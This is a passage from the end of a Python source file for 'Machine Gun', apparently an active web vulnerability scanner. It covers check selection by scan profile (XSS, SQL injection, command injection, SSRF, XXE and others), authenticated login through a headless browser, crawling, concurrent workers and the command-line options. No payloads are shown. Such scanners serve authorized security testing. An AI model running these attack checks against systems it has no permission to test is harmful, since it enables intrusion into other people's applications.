                                    f"Send a POST request to `{escape(final_url_post_json)}` with `Content-Type: application/json` and JSON body: `{escape(json.dumps(json_data_to_send))}`",
                                    "Observe the response for anomalies (e.g., unexpected errors, data changes, different response structure)."
                                ],
                                remediation_steps=[
                                    "**Strict Input Validation:** Validate all API parameters on the server-side for type, format, length, and allowed values.",
                                    "**Error Handling:** Implement robust error handling that provides generic error messages without leaking internal details.",
                                    "**API Rate Limiting:** Apply rate limiting to API endpoints to prevent brute-force attacks."
                                ]
                            )
                            # Do not return
                    except json.JSONDecodeError:
                        logger.debug(f"Skipping JSON fuzzing for {url} as payload not JSON compatible.")
                    except Exception as e:
                        logger.error(f"Error during API JSON fuzzing on {url}: {e}")
# --- Main Scan Orchestration ---

async def start_scanner(cli_args: argparse.Namespace):
    """Orchestrates the entire scanning process: crawling, authentication, fingerprinting, and running checks."""
    logger.info(f"Starting scan for {cli_args.url} with profile '{cli_args.profile}'")
    report = ScanReport(cli_args.url)
    report.cli_args_used = cli_args
    report.scan_profile_used = cli_args.profile
    concurrency_manager = AdaptiveConcurrencyManager(cli_args.concurrency_level, MAX_CONCURRENCY)

    interactsh_client: Optional[InteractshClient] = None
    if cli_args.interactsh_server:
        interactsh_client = InteractshClient(cli_args.interactsh_server)
        if not await interactsh_client.register():
            logger.error("Failed to register with Interactsh. OOB checks will not function.")
            interactsh_client = None # Disable OOB if registration fails

    # Define all available checks (map string name to async function)
    all_available_checks = {
        "headers": check_security_headers,
        "xss": check_xss,
        "dom_xss": check_dom_xss, # New DOM XSS check
        "sqli": check_sqli,
        "lfi": check_lfi,
        "command_injection": check_command_injection,
        "ssrf": check_ssrf,
        "ssti": check_ssti,
        "xxe": check_xxe,
        "crlf": check_crlf_injection,
        "idor": check_idor,
        "jwt": check_jwt_vulnerabilities,
        "directory_listing": check_directory_listing,
        "js_info_disclosure": check_info_disclosure_js,
        "subdomain_takeover": check_subdomain_takeover,
        "file_upload": check_insecure_file_upload,
        "race_condition": check_race_condition,
        "excessive_data_exposure": check_excessive_data_exposure,
        "log_injection": check_log_injection,
        "parameter_tampering": check_parameter_tampering,
        "client_side_storage": check_sensitive_client_storage, # New client-side storage check
        "cors_misconfig": check_cors_misconfiguration, # New CORS check
        "client_side_open_redirect": check_client_side_open_redirect, # New client-side open redirect
        "api_fuzzing": check_api_fuzzing, # New API fuzzing check
    }
    
    # Select checks based on profile
    checks_to_run_names: Set[str] = set()
    if cli_args.profile == "passive":
        checks_to_run_names.update(["headers", "js_info_disclosure", "directory_listing", "excessive_data_exposure", "client_side_storage", "cors_misconfig"])
    elif cli_args.profile == "default":
        checks_to_run_names.update([
            "headers", "xss", "sqli", "lfi", "command_injection", "ssrf", "ssti", "xxe", "crlf", "idor",
            "js_info_disclosure", "directory_listing", "excessive_data_exposure", "parameter_tampering",
            "client_side_storage", "cors_misconfig", "client_side_open_redirect", "api_fuzzing" # Added new checks
        ])
    elif cli_args.profile == "full":
        checks_to_run_names.update(all_available_checks.keys()) # Run all available checks
    elif cli_args.profile == "insane": # 'insane' maps to 'extreme' payload level
        checks_to_run_names.update(all_available_checks.keys())
        cli_args.payload_level = "extreme" # Force extreme payload level

    # Apply --scan-modules and --skip-checks overrides
    if cli_args.scan_modules:
        explicit_modules = {c.strip() for c in cli_args.scan_modules.split(',')}
        temp_checks_to_run = set()
        for mod in explicit_modules:
            if mod.startswith('-'): # Skip module
                checks_to_run_names.discard(mod[1:])
            else: # Run module
                if mod in all_available_checks:
                    temp_checks_to_run.add(mod)
                else:
                    logger.warning(f"Unknown scan module '{mod}', skipping.")
        if temp_checks_to_run: # If explicit modules are given, override profile selection
            checks_to_run_names = temp_checks_to_run
    
    # Ensure specified skip-checks are removed even if they were added by profile or run-checks
    if cli_args.skip_checks:
        explicit_skip = {c.strip() for c in cli_args.skip_checks.split(',')}
        checks_to_run_names = checks_to_run_names.difference(explicit_skip)

    # Filter out browser-dependent checks if Playwright is not enabled or available
    browser_dependent_checks = {"dom_xss", "client_side_open_redirect", "client_side_storage"}
    if not cli_args.enable_browser_scan:
        for check_name in browser_dependent_checks:
            if check_name in checks_to_run_names:
                logger.info(f"{check_name} check skipped as --enable-browser-scan is not set.")
                checks_to_run_names.discard(check_name)
    
    checks_to_run = [all_available_checks[name] for name in checks_to_run_names if name in all_available_checks]
    logger.info(f"Selected checks for scan: {[c.__name__ for c in checks_to_run]}")

    # Initialize Playwright browser if browser-based scanning is enabled or login is required
    pw_browser: Optional[Browser] = None
    if cli_args.enable_browser_scan or cli_args.login_url:
        try:
            p = await async_playwright().start()
            # Launch browser with proxy if specified
            browser_launch_options = {}
            if cli_args.proxy:
                parsed_proxy = urlparse(cli_args.proxy)
                browser_launch_options['proxy'] = {
                    'server': f"{parsed_proxy.scheme}://{parsed_proxy.netloc}"
                }
                if parsed_proxy.username and parsed_proxy.password:
                    browser_launch_options['proxy']['username'] = parsed_proxy.username
                    browser_launch_options['proxy']['password'] = parsed_proxy.password

            pw_browser = await p.chromium.launch(headless=True, timeout=PLAYWRIGHT_TIMEOUT, **browser_launch_options)
            logger.info("Playwright browser launched successfully for dynamic analysis and/or login.")
        except PlaywrightError as e:
            logger.critical(f"Failed to launch Playwright browser: {e}. Browser-based scans (e.g., DOM XSS, Client-Side Storage) and login will be skipped.", exc_info=True)
            pw_browser = None # Ensure it's None if launch fails

    # Perform login if specified
    if cli_args.login_url and pw_browser:
        if not await login_with_playwright(pw_browser, cli_args.login_url, cli_args.username, cli_args.password, report, cli_args):
            logger.error("Login failed. Proceeding with unauthenticated scan.")
            # Clear any partial login cookies/headers if login failed
            report.session_cookies = {}
            report.session_headers = {}
    elif cli_args.login_url and not pw_browser:
        logger.warning("Login URL provided but Playwright browser failed to launch. Cannot perform login.")

    # Setup aiohttp session with proxy and authentication headers
    conn = aiohttp.TCPConnector(ssl=False, resolver=aiohttp.resolver.AsyncResolver()) # Disable SSL verification for testing, use async resolver
    session_headers = {}
    
    # Apply session cookies/headers obtained from login
    if report.session_cookies:
        cookie_str = "; ".join([f"{k}={v}" for k, v in report.session_cookies.items()])
        session_headers['Cookie'] = cookie_str
    if report.session_headers:
        session_headers.update(report.session_headers)

    # Apply CLI auth headers (CLI takes precedence or merges)
    if cli_args.auth_cookie: session_headers['Cookie'] = cli_args.auth_cookie
    if cli_args.auth_header:
        try:
            key, val = cli_args.auth_header.split(':', 1)
            session_headers[key.strip()] = val.strip()
        except ValueError:
            logger.error(f"Invalid --auth-header format: '{cli_args.auth_header}'. Expected 'Key: Value'.")

    async with aiohttp.ClientSession(connector=conn, headers=session_headers, timeout=aiohttp.ClientTimeout(total=cli_args.timeout)) as session:
        # Step 1: Crawl the site to discover surface area
        await crawl_and_discover(session, pw_browser, report, concurrency_manager, cli_args.url, cli_args.crawl_depth, cli_args.max_urls, cli_args)
        
        logger.info(f"Crawl complete. Found {len(report.crawled_urls)} unique pages to scan, {len(report.parameters_discovered)} unique URLs with parameters, and {len(report.api_endpoints_discovered)} API endpoints.")

        # NEW STEP: Explicitly build baselines for all crawled URLs before starting vulnerability checks
        logger.info("Building behavioral baselines for all discovered URLs...")
        baseline_tasks = []
        for url_to_baseline in report.crawled_urls:
            # Only build baseline if it hasn't been built during crawl (e.g., if aiohttp failed but playwright succeeded)
            if normalize_url(url_to_baseline) not in report.baseline_profiles:
                # Ensure we pass the session and concurrency manager to build_behavioral_baseline
                baseline_tasks.append(build_behavioral_baseline(session, report, concurrency_manager, url_to_baseline, cli_args.proxy))
        
        if baseline_tasks:
            # Use a limited number of concurrent tasks for baseline building to avoid overwhelming the target
            await asyncio.gather(*baseline_tasks)
        logger.info("Behavioral baselines built for discovered URLs.")

        # Step 2: Create a queue of tasks (URL, check_function)
        task_queue: asyncio.Queue[Tuple[str, Callable, Optional[Page]]] = asyncio.Queue() # Added Optional[Page] for browser checks
        
        # Add tasks for each crawled URL and each selected check
        for url_to_scan in report.crawled_urls:
            for check_func in checks_to_run:
                # Determine if a Playwright page is needed for this check
                requires_browser_page = check_func in [check_dom_xss, check_sensitive_client_storage, check_client_side_open_redirect]
                
                if requires_browser_page:
                    if pw_browser: # Only add if browser is available
                        await task_queue.put((url_to_scan, check_func, pw_browser))
                    else:
                        logger.debug(f"Skipping {check_func.__name__} for {url_to_scan} as browser is not available.")
                else:
                    await task_queue.put((url_to_scan, check_func, None)) # No page needed

        # Add JS files specifically for sensitive info disclosure if not already covered
        if all_available_checks["js_info_disclosure"] in checks_to_run:
            for js_file_url in report.js_files_found:
                if js_file_url not in report.queued_or_processed_urls: # Avoid double-adding if already crawled
                    await task_queue.put((js_file_url, all_available_checks["js_info_disclosure"], None))
        
        # Add API endpoints for API fuzzing
        if all_available_checks["api_fuzzing"] in checks_to_run:
            for api_url in report.api_endpoints_discovered:
                await task_queue.put((api_url, all_available_checks["api_fuzzing"], None))


        # Step 3: Create worker tasks to process the queue
        worker_tasks = []
        for i in range(cli_args.concurrency_level):
            task = asyncio.create_task(worker(f"worker-{i+1}", task_queue, session, report, concurrency_manager, interactsh_client, pw_browser, cli_args))
            worker_tasks.append(task)

        # Wait for all tasks to be processed and then cancel workers
        try:
            await task_queue.join() # Wait until all tasks in the queue are marked done
        finally:
            # Cancel worker tasks after the queue is joined or an exception occurs
            for task in worker_tasks:
                task.cancel()
            # Wait for workers to finish cancelling, suppressing CancelledError
            await asyncio.gather(*worker_tasks, return_exceptions=True)

    logger.info("Scan completed. Generating and saving reports.")
    report.save_reports()
    if interactsh_client:
        await interactsh_client.close()
    if pw_browser:
        await pw_browser.close() # Close Playwright browser
    logger.info("Reports saved. Exiting.")


# The worker function needs to accept these arguments
async def worker(name: str, task_queue: asyncio.Queue, session: aiohttp.ClientSession, report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, interactsh_client: Optional[InteractshClient], pw_browser: Optional[Browser], cli_args: argparse.Namespace):
    while True:
        url_to_check = None
        check_func = None
        browser_page_for_check = None # This will be the specific page for browser-based checks
        try:
            url_to_check, check_func, browser_page_for_check = await task_queue.get()
            logger.debug(f"{name}: Processing {check_func.__name__} on {url_to_check}")
            
            # Pass all necessary context to the check function
            if check_func in [check_dom_xss, check_sensitive_client_storage, check_client_side_open_redirect]:
                # For browser-based checks, we pass the main browser page from scan_target
                # The check function itself is responsible for creating/closing sub-pages if needed
                await check_func(
                    browser_page=browser_page_for_check, # Pass the main browser page
                    report=report,
                    concurrency_manager=concurrency_manager,
                    url=url_to_check,
                    params_map=report.parameters_discovered,
                    cli_args=cli_args,
                    interactsh_client=interactsh_client
                )
            else:
                await check_func(
                    session=session,
                    report=report,
                    concurrency_manager=concurrency_manager,
                    url=url_to_check,
                    params_map=report.parameters_discovered,
                    cli_args=cli_args,
                    interactsh_client=interactsh_client # Pass Interactsh client
                )
        except asyncio.CancelledError:
            logger.debug(f"{name}: Worker cancelled.")
            break # Exit loop if cancelled
        except Exception as e:
            error_url = url_to_check if url_to_check else "N/A"
            error_check_name = check_func.__name__ if check_func else "UnknownCheck"
            report.add_error(f"Error in check {error_check_name} on {error_url}: {e}", error_url, error_check_name)
        finally:
            # Ensure task_done is called exactly once for each item retrieved
            if url_to_check is not None: # Only call task_done if an item was successfully retrieved
                task_queue.task_done()


def main():
    parser = argparse.ArgumentParser(
        description="Machine Gun - Web Vulnerability Scanner (by out_of_face)",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("--exclude-url-pattern", type=str, help="Regular expression to exclude URLs from scanning.")
    parser.add_argument("url", type=str, help="The base URL of the web application to scan (e.g., https://example.com).")
    parser.add_argument("--profile", type=str, default="default",
                        choices=["passive", "default", "full", "insane"],
                        help="Scan profile intensity:\n"
                             "  - passive: Minimal interaction. Header checks, robots, sitemap, basic fingerprinting. Minimal crawl.\n"
                             "  - default: Passive + common, safer active vulnerability checks (Recommended).\n"
                             "  - full:    Default + more intensive/potentially noisy active checks. Deeper crawl.\n"
                             "  - insane:  Full + deepest crawl, highest payload variations (very slow/noisy).\n"
                             "Default: default")
    parser.add_argument("--payload-level", type=str, default=DEFAULT_PAYLOAD_LEVEL,
                        choices=["low", "medium", "high", "extreme"],
                        help="Controls the number of payload variations tried per check.\n"
                             "Default: medium")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT,
                        help=f"HTTP request timeout in seconds. Default: {DEFAULT_TIMEOUT}")
    parser.add_argument("--crawl-depth", type=int, default=DEFAULT_CRAWL_DEPTH,
                        help=f"Maximum depth for crawling. Default: {DEFAULT_CRAWL_DEPTH}")
    parser.add_argument("--max-urls", type=int, default=DEFAULT_MAX_URLS_TO_SCAN,
                        help=f"Maximum number of unique URLs to scan. Default: {DEFAULT_MAX_URLS_TO_SCAN}")
    parser.add_argument("--concurrency-level", type=int, default=DEFAULT_CONCURRENCY,
                        help=f"Initial number of concurrent requests. Adaptive up to {MAX_CONCURRENCY}. Default: {DEFAULT_CONCURRENCY}")
    parser.add_argument("--proxy", type=str, help="HTTP/SOCKS proxy (e.g., http://127.0.0.1:8080).\n"
                                                    "Note: Playwright also uses this proxy.")
    parser.add_argument("--log-file", type=str, help="Optional file to write logs to.")
    parser.add_argument("-v", "--verbose", action="count", default=0,
                        help="Increase verbosity. -v for INFO, -vv for DEBUG, etc.")
    parser.add_argument("--auth-cookie", type=str, help="Custom cookie header (e.g., 'sessionid=abc; csrf_token=xyz').")
    parser.add_argument("--auth-header", type=str, help="Custom Authorization header (e.g., 'Authorization: Bearer <token>').")
    parser.add_argument("--interactsh-server", type=str, default=INTERACTSH_SERVER,
                        help=f"Interactsh server URL for OOB interactions. Default: {INTERACTSH_SERVER}")
    parser.add_argument("--scan-modules", type=str,
                        help="Comma-separated list of modules to run (e.g., 'xss,sqli'). Use '-' prefix to skip (e.g., '-lfi').")
    parser.add_argument("--skip-checks", type=str,
                        help="Comma-separated list of checks to explicitly skip (e.g., 'jwt,race_condition'). Overrides profile.")
    parser.add_argument("--enable-browser-scan", action="store_true",
                        help="Enable browser-based scanning (e.g., DOM XSS, client-side storage, client-side open redirect). Requires Playwright installation.")
    parser.add_argument("--login-url", type=str,
                        help="URL for login page to perform authenticated scans. Requires --username and --password.")
    parser.add_argument("--username", type=str, help="Username for Playwright-based login.")
    parser.add_argument("--password", type=str, help="Password for Playwright-based login.")
    parser.add_argument("--config", type=str, help="Path to a YAML configuration file.")

    args = parser.parse_args()

    # Load configuration from YAML file if provided
    if args.config:
        try:
            with open(args.config, 'r', encoding='utf-8') as f:
                config = yaml.safe_load(f)
            # Override CLI args with config file values if present
            for key, value in config.items():
                if hasattr(args, key) and value is not None:
                    setattr(args, key, value)
            logger.info(f"Configuration loaded from {args.config}")
        except FileNotFoundError:
            logger.error(f"Config file not found: {args.config}. Proceeding with CLI arguments/defaults.")
        except yaml.YAMLError as e:
            logger.error(f"Error parsing YAML config file {args.config}: {e}. Proceeding with CLI arguments/defaults.")

    # Setup logging
    log_level = logging.WARNING
    if args.verbose == 1: log_level = logging.INFO
    elif args.verbose >= 2: log_level = logging.DEBUG
    
    logger.setLevel(log_level)
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(ColoredFormatter())
    if not logger.handlers: # Ensure handlers are not duplicated if main is called multiple times (e.g., in tests)
        logger.addHandler(console_handler)

    if args.log_file:
        file_handler = logging.FileHandler(args.log_file, mode='a', encoding='utf-8')
        file_handler.setFormatter(logging.Formatter('%(asctime)s - [%(levelname)s] - %(message)s'))
        logger.addHandler(file_handler)

    # Print disclaimer with new branding
    print(AnsiColors.colorize("="*80, AnsiColors.WARNING))
    print(AnsiColors.colorize(" " * 24 + "MACHINE GUN - Web Vulnerability Scanner", AnsiColors.BOLD + AnsiColors.WARNING))
    print(AnsiColors.colorize(" " * 35 + "by out_of_face", AnsiColors.WARNING))
    print(AnsiColors.colorize(" Use this tool responsibly and only on authorized systems.", AnsiColors.WARNING))
    print(AnsiColors.colorize("="*80, AnsiColors.WARNING))
    
    try:
        normalized_target_url = normalize_url(args.url)
        if not normalized_target_url:
            logger.critical("Invalid target URL. Please provide a full URL (e.g., http://example.com or https://example.com).")
            return
        args.url = normalized_target_url # Update args.url with normalized version

        # Check for login requirements
        if args.login_url and (not args.username or not args.password):
            logger.critical("Login URL provided, but --username and --password are required for authenticated scanning.")
            return
        
        asyncio.run(start_scanner(args))
    except KeyboardInterrupt:
        logger.warning("Scan interrupted by user. Exiting.")
    except Exception as e:
        logger.critical(f"An unhandled critical error occurred during scan: {e}", exc_info=True)


if __name__ == "__main__":
    main()
